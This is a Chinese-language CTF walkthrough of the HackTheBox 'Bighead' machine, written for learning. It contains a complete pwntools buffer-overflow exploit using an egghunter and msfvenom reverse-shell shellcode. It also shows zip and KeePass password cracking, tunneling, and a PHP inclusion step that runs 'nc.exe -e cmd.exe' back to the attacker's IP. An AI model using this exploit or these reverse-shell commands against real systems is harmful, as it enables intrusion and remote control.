HTB靶机渗透系列之Bighead
2022-03-11 09:47:38

Bighead是一个非常困难的靶机，知识点涉及zip密码爆破、子域名探测、git信息泄漏、缓冲区溢出、隧道建立、BvShell逃逸、KeePass密码破解等。感兴趣的同学可以在HackTheBox中进行学习。



通关思维导图

0x01 侦查

端口探测

首先通过nmap对目标进行端口扫描

nmap -Pn -p- -sV -sC -A 10.10.10.112 -oA nmap_BigHead



扫描结果显示目标只开放了80端口

80端口

访问站点发现是一个博客网站

对该站点进行目录扫描

gobuster dir -u http://10.10.10.112 -w /usr/share/wordlists/dirb/big.txt -x php



扫描目录过程中发现重定向，在hosts文件中修改域名解析

vim /etc/hosts
## 配置
10.10.10.112 bighead.htb
10.10.10.112 code.bighead.htb


访问文件phpinfo.php，其中显示系统版本为 Windows Server 2008

而访问/backend目录则显示报错界面

子域名探测

在站点界面中点击发送可发现第二个子域名mailer.bighead.htb，也将其添加到hosts文件当中

为了探测更多的子域名，我们可以使用 wfuzz 对其子域名进行枚举

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://bighead.htb -H "Host: FUZZ.bighead.htb" --hh 11175



发现新的子域名dev，也将其添加到hosts文件中并进行目录扫描

gobuster dir -u http://dev.bighead.htb -w /usr/share/wordlists/dirb/big.txt -x php



以/blog结尾的目录会重定向至/wp-content目录下，访问后出现错误。而访问/coffee则出现以下界面

查看响应对比 Server 发现其发生了变化：由之前的 Nginx 改为 BigheadWebsvr


0x02 上线[nelson]

zip密码爆破

在谷歌中搜索 BigheadWeb 的相关漏洞

成功在 github 中发现 zip 压缩文件并将其下载下来

git clone https://github.com/3mrgnc3/BigheadWebSvr


使用 unzip 解压 zip 文件，但是无法获取到其中的内容

unzip BHWS_Backup.zip



切换 7z 进行解压，解压需要密码

7z x BHWS_Backup.zip



尝试使用 zip2john 进行密码爆破

zip2john BHWS_Backup.zip > BHWS_Backup.zip.hash
john BHWS_Backup.zip --wordlist=/usr/share/wordlists/rockyou.txt



成功拿到密码为thepiedpiper89，使用该密码通过 7z 解压

7z x BHWS_Backup.zip


成功解压后查看解压后的所有文件

find BHWS_Backup/ -type f


但是进入解压目录后，查看提示文件提示：Gilfoyle已经删除了存在漏洞的软件

git信息泄漏

通过 git 查看提交历史，发现它存在四次提交历史

git log --oneline



重点查看第二次提交，其中包含 zip 压缩文件

git checkout b1b4d6e



使用原来的密码对其进行解压，提示密码错误

7z x BHWS_Backup.zip



采用与之前一样的方法对解压密码进行爆破

zip2john BHWS_Backup.zip > BHWS_Backup.zip.hash
john BHWS_Backup.zip --wordlist=/usr/share/wordlists/rockyou.txt



成功破解密码为bighead，使用该密码解压后发现如下文件

find BHWS_Backup/ -type f



相比之前的版本多了个 exe 以及 dll 文件

缓冲区溢出

源码分析

存在 exe 和 dll 文件说明可能需要使用缓冲区溢出漏洞，一般情况下是采用模糊测试直至程序崩溃，接下来启动 IDA 来进行测试。首先按Shift+F12调出 Strings 窗口

在其中找到了传入 HTTP 请求的字符串，也就是用户输入和服务器交互的地方，点击GET /coffee将被带到该字符串在内存中的位置，可以发现该字符串位于0x004077F3

IDA 还显示_ConnectionHandler@4，点击aGetCoffee后再按x会跳转到包含该字符串被引用的代码

点击OK跳转

查看_ConnectionHandler@4运行代码


在 IDA 加载时我们可以知道这是一个网络服务器，所以它很可能会创建一个 socket，将它绑定到 post 请求上，监听并等待连接。通过分叉来处理这些连接（在 windows 中会启动一个线程）

查看字符串还可以发现提示：这是一个存在漏洞的软件

绿色标记部分用于处理连接，而红色部分代码用于创建线程来处理连接的调用


找到loc_401A90，发现它将每两个字节从十六进制转换为一个字节值，并将其存储到堆上的缓冲区，然后它返回到这个本地循环的底部。由于其中可以写入远超12字节的已分配数据，所以将会发生堆溢出。

本地模拟测试

将 exe 和 dll 文件转移到 Windows 环境中并点击运行但是出现报错

需要安装mingw，安装完成后进入MinGW的仓库
下载地址：https://zh.osdn.net/projects/mingw/

找到libmingwex-dll，右键选择安装并点击Apply Changes

找到libmingwex-4.dll并将其中的复制到服务器目录当中，与此同时修改其名字为libmingwex-0.dll


程序运行成功

查看本地8008端口，成功访问


开启Community运行BigHeadWebSvr，首先需要找到EIP的偏移量，因为输入在覆盖之前会从十六进制转换到二进制，所以我需要发送十六进制编码的输入，使用kali中的msf-pattern_create可生成50位随机数值

msf-pattern_create -l 50 | xxd -p | tr -d "\n"



向目标地址发送该随机值后程序直接崩溃

curl --head http://172.16.54.39:8008/41613041613141613241613341613441613541613641613741613841613941623041623141623241623341623441623541620a



EIP寄存器地址为41326241，使用 msf-pattern 找到偏移量，转换后发现偏移量为36

msf-pattern_offset -q 41326241


尝试对偏移量进行验证，EIP寄存器显示BBBBBBBB则说明验证成功

curl --head http://172.16.54.39:8008/$(python -c 'print "A"*72 + "B"*8')



可借助mona在开发漏洞利用时的自动化和特定搜索，将mona.py放入/PyCommands文件夹（在Immunity Debugger应用程序文件夹内）
下载地址：https://github.com/corelan/mona

加载mona来检查模块

!mona modules


在查询结果中关注没有ASLR的情况，搜索jmp esp寻找ESP寄存器跳转地址

!mona jmp -r esp


成功找到地址为0x625012f0，使用mona的Egg Hunter功能来寻找插入值0xdf

!mona egg -t 0xdf



可发现存在32字节输出可用于shellcode存储，由于0xdf对应的十六进制为30786466，那么对应的值就是

6681caff0f42526a0258cd2e3c055a74efb8 + egg + 8bfaaf75eaaf75e7ffe7


编写溢出脚本

根据以上信息0xdf大神写了如下脚本用于获取反弹shell

#!/usr/bin/env python

import os
import subprocess
import sys

from pwn import *
from time import sleep

context(terminal=['tmux', 'new-window'])
context(os='windows', arch="i386")


def clean_and_exit(msg, files):
    print(msg)
    for f in files:
        try:
            os.remove(f)
        except:
            pass
    sys.exit()


if len(sys.argv) != 5:
    clean_and_exit("%s [target] [target port] [callback ip] [callback port]" % (sys.argv[0]), [])

target = sys.argv[1]
port = sys.argv[2]
cb_ip = sys.argv[3]
cb_port = sys.argv[4]

# Generate Shellcode 
msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o sc.py' % (cb_ip, cb_port)
print("[*] Generating shellcode:\n    %s" % msfvenom_string)
p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()

try:
    if "Error" in err:
        raise Exception("[-] Unable to generate shellcode\n    %s" % err)
    from sc import shellcode
except (NameError, Exception) as e:
    clean_and_exit(e.message, ['sc.py', 'sc.pyc'])

print("[+] Shellcode generated successfully")
os.remove('sc.py')
os.remove('sc.pyc')

# !mona egg -t
egg = '0xdf'
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + egg.encode('hex') + "8bfaaf75eaaf75e7ffe7"

nops = "\x90"*16
spray = egg + egg + nops + shellcode
post = 'POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n'.format(len(spray))
spray_payload = post + spray

head = "HEAD /"
junk = "1" * (78-len(head))
jmp_esp = "f0125062" #p32(0x625012f0)
host = " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
exec_payload = head + junk + jmp_esp + egghunter + host

print("[*] Sending payload 5 times")
for i in range(5):
    p = remote(target, port)
    #print(spray_payload)
    p.sendline(spray_payload)
    p.recv()
    p.close()
    sleep(0.1)

print("[+] Payload sent.\n[*] Sleeping 1 second.")
sleep(1)

print("[*] Sending overflow + egghunter.")
print("[*] Expect callback in 0-15 minutes to %s:%s." % (cb_ip, cb_port))
p = remote(target, port)
p.sendline(exec_payload)
sleep(1)
p.recv()
p.close()


以上代码通过生成 shellcode 来构造web请求，并设置带有payload的Head，最终重复发送5次post请求

建立隧道

在本地连接靶机的2020端口需要建立隧道。我将使用 plink、chisel、msf来尝试建立

plink

首先需要在本地开启 smb 服务

cp /usr/share/doc/python3-impacket/examples/smbserver.py .

在靶机上传输 plink.exe

copy \\10.10.16.3\mac\plink.exe C:\Users\Nelson\AppData\Local\Temp\

plink.exe -R 2020:localhost:2020 kali@10.10.16.3


但是一直显示连接超时，建立失败。切换 chisel 来尝试建立隧道

copy \\10.10.16.3\mac\chisel_1.7.6_windows_386 C:\Users\Nelson\AppData\Local\Temp\c

copy c C:\Windows\System32\spool\drivers\color\

但是还是出现问题，于是再次切换至msf中

0x04 权限提升[system]

BvShell逃逸

在apps目录下发现这个testlink目录，由于之前在nginx.conf中见到过该目录，所以在子域名中进行尝试，最终在code子域名下发现蹊跷，访问后会之前跳转到http://127.0.0.1:5080/testlink/login.php，于是首先将目标端口转发到本地5080

meterpreter > portfwd add -l 5080 -p 5080 -r 127.0.0.1



访问后出现多个报错信息，在目录apps/testlink/htdocs下发现提示文件note.txt：Bighead 破坏了 code，而 Dinesh 回应他整晚都在测试代码

查看文件最近修改时间可以注意到linkto.php是最近被修改的文件

ls -l *.php



尝试访问/testlink/linkto.php文件，它在require_once打开空字符串调用中失败

打开linkto.php文件发现代码顶部存在一串注释，在注释后存在变量$PiperCoinAuth，如果存在另一个 post 参数，则该变量由 post 参数设置，再传递给require_once

这也就意味着我可以在主机上任何位置提供路径，而它将被包含在内。于是开始部署 php 用于反弹shell
参考地址：https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

准备 nc.exe 和用于执行反弹的 php 代码

<?php
system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.16.3 2222');
?>


开始上传木马 mac.php 以及 nc.exe

copy \\10.10.16.3\mac\nc.exe \users\nelson\appdata\local\temp\nc.exe
copy \\10.10.16.3\mac\mac.php \users\nelson\appdata\local\temp\mac.php


执行 post 请求并在本地监听2222端口

curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\mac.php"

寻找flag

KeePass识别

在用户 nginx 桌面上寻找flag

dir C:\Users\nginx\Desktop
type C:\Users\nginx\Desktop\user.txt



成功找到第一个flag，在管理员桌面上继续寻找第二个flag

dir C:\Users\administrator\Desktop
dir C:\Users\administrator\Desktop /a



发现 root.txt 被隐藏，通过命令可以显示该flag文件

type C:\Users\administrator\Desktop\root.txt



但是这并不是一个真正的root.txt，靶机中还存在 Keepass 注册表项，经过一番寻找后最终在管理员用户目录下找到对应的 xml 配置文档

type C:\Users\administrator\AppData\Roaming\KeePass\KeePass.config.xml




根据提示信息可以推断 root.txt 是数据库，而 admin.png 为密钥，同时下载它们

破解密码

进入 bash 命令行，在管理员桌面上将 root.txt 复制至/appdata/local/temp目录下

\progra~1\bash\bash.exe
cd C:/Users/Administrator/Desktop
cat root.txt:Zone.Identifier > ../appdata/local/temp/a.txt


同时输出文件的 md5 值

md5sum root.txt:Zone.Identifier ../appdata/local/temp/a.txt



退出 bash 后拷贝这两个文件至本地目录

copy ..\appdata\local\temp\a.txt \\10.10.16.3\mac\db.kdbx
copy ..\Pictures\admin.png \\10.10.16.3\mac\admin.png


校验文件 md5 值成功，说明文件在传输过程中未发生改变

file db.kdbx admin.png



将db.kdbx重命名为root.txt:Zone.Identifier，使用 keepass2john 将其转换为可破解的哈希值

keepass2john -k admin.png root.txt:Zone.Identifier | tee keepass.hash


使用 hashcat 对该哈希值进行破解

hashcat -m 13400 -a 0 -o keepass.cracked keepass.hash /usr/share/wordlists/rockyou.txt --force


成功拿到密码为darkness，使用 keepass2 进行打开

keepass2 root.txt:Zone.Identifier


将 admin.png 作为密钥，同时输入以上密码

在其中发现 Password 的值为星号

复制该密码并粘贴到本地即可成功获取第二个flag

总结：在站点的子域名中发现响应数据包中的服务器为BigheadWebsvr，谷歌搜索找到github上存在该服务器的源码，下载对应的zip压缩文件。使用zip2john破解出该压缩包的明文密码并通过该密码解压，其中存在git信息泄漏漏洞：在版本二中存在exe与dll文件，移至Windows上测试后发现存在缓冲区溢出，至此编写脚本对该服务器进行攻击从而可以获取到用户权限。靶机上存在2020端口，其对应进程为BvSshServer，由于外部无法访问该端口，我们需要搭建隧道并使用注册表中破解的密码登陆ssh，成功登陆后运行环境为BvShell，借助code子域名中的php文件执行反弹shell成功获取系统权限。逃逸BvShell后在靶机上发现KeePass以及提示信息，最终破解KeePass数据库密码后使用该密码并配置密钥登陆其中拿到flag。
